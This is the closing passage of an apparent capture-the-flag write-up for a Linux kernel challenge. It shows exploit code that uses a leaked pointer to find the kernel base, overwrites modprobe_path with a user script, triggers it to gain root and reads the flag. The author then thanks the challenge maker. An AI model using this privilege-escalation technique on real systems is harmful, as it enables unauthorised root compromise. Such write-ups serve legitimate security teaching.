    uint64_t ptr = get_leak(); // tty_dev_attr_group

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t modprobe_path = kbase + 0x164ec60;

    printf("kernel base: %p\n", kbase);
    printf("modprobe_path: %p\n", modprobe_path);

    write_str(modprobe_path, "/home/user/to_exec.sh");

    system("/home/user/invalid");
    system("cat /root/flag.txt");
}
```

Lastly, I want to say that I might have got some things wrong, if you know about it or want to discuss something or have any questions, ping me on discord `stdnoerr#7880`.<br>
I want to say thanks to `Bitfriends#2070` for making this challenge.
